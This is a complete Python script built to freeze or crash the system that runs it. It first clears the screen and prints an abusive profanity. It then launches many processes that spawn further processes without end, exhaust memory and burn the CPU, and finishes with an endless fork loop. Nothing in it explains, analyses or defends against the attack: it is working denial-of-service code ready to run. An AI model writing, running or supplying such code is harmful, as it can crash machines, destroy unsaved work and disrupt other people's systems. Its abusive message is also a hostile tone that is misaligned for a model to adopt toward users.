import os
import sys
from multiprocessing import Process

def display_message():
    """Show message before freeze"""
    os.system('clear')
    print('\033[2J\033[H', end='')
    print('\n' * 10)
    print(' ' * 20 + 'Get fucked bitch')
    sys.stdout.flush()

def memory_bomb():
    """Allocate massive memory to choke the system"""
    data = []
    while True:
        data.append(' ' * 10**6)
        data.append(data[:])

def fork_spam():
    """Spawn processes recursively"""
    while True:
        try:
            p = Process(target=fork_spam)
            p.start()
            p = Process(target=memory_bomb)
            p.start()
        except:
            pass

def cpu_burn():
    while True:
        pass

if __name__ == '__main__':
    display_message()
    
    for i in range(50):
        try:
            Process(target=fork_spam).start()
            Process(target=memory_bomb).start()
            Process(target=cpu_burn).start()
        except:
            pass
    
    while True:
        os.fork()
